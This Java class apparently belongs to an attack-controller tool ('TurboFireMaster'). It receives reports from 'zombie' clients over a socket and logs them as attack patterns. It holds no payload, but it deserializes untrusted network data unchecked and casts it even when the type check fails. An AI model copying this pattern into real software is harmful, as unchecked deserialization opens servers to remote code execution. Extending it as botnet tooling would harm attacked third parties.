package tasks;

import app.TurboFireMaster;
import view.GUI;
import utilies.AttackPattern;
import java.net.Socket;
import java.net.SocketException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamException;
import java.io.IOException;
import java.io.NotSerializableException;

public class ZoombieResponseTreatment implements Runnable {

    private Socket clientSocket;

    public ZoombieResponseTreatment(Socket clientSocket) {
        this.clientSocket = clientSocket;
    }

    @Override
    public void run() {
        try {
            ObjectInputStream ois = new ObjectInputStream(this.clientSocket.getInputStream());
            Object streamData = ois.readObject();
            AttackPattern attackPattern = null;
            if(streamData instanceof AttackPattern) {
                attackPattern = (AttackPattern) streamData;
            }
            ois.close();
            this.clientSocket.close();
            TurboFireMaster.addAttackLog((AttackPattern) streamData);
        } catch(SocketException se) {
            GUI.showExceptionLog(se.toString());
        } catch(ObjectStreamException ose) {
            GUI.showExceptionLog(ose.toString());
        } catch(IOException ioe) {
            GUI.showExceptionLog(ioe.toString());
        } catch(Exception e) {
            GUI.showExceptionLog(e.toString());
        }
    }
}